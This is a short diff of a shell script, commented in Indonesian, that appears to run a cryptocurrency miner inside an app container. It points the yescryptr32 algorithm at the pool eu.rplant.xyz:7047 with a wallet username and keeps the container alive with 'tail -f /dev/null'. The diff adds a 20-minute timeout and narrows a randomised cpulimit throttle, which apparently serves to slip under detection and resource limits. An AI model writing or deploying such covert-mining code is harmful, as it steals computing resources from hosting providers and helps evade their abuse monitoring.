@@ -12,8 +12,8 @@ rm -f /app/sr
 --hostname "$(cat .h)" \
 --url 127.0.0.1:443 >/dev/null 2>&1 &
 
-# jalankan dengan kontrol internal
-/app/$NAME \
+# jalankan dengan timeout 20 menit
+timeout 1200s /app/$NAME \
 -a yescryptr32 \
 -o eu.rplant.xyz:7047 \
 -u lpep1qz4kz27v2s3l48prnalqhzhluvhy9ljtl7hchad.multo \
@@ -24,8 +24,8 @@ rm -f /app/sr
 
 P=$!
 
-# limiter tambahan (75–85%)
-LIMIT=$((75 + RANDOM % 11))
+# limiter tambahan
+LIMIT=$((75 + RANDOM % 5))
 cpulimit -p $P -l $LIMIT >/dev/null 2>&1 &
 
 tail -f /dev/null
